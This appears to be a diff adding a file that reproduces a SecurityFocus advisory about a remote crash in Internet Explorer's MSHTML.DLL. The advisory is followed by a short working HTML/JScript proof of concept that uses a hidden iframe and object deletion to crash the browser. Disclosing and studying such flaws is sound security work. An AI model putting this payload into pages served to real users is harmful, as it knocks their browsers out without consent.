@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/2202/info
+
+MSHTML.DLL is the shared library for parsing HTML in Internet Explorer and related applications. It may be possible for an attacker to crash this library remotely and cause a denial of service with special Jscript code.
+
+This bug involves Jscript's ability to handle multiple window objects. If a window object is deleted after it receives data and then re-initalized, the library will reportedly crash. This behavior has been attributed to a stack overflow by its discoverer. It is reportedly not exploitable in any way that may permit an attacker to gain access to the victim host.
+
+Microsoft has acknowledged this bug and it should be fixed in the next service pack. 
+
+<iframe id=test style="display:none"></iframe>
+<script>
+Larholm = {}; // Object literal
+test.document.open(); // Stream data
+test.document.write("<s"+"cript>top.Larholm.test=0</s"+"cript>");
+delete Larholm;
+Larholm = {}; // Crash
+</script> 
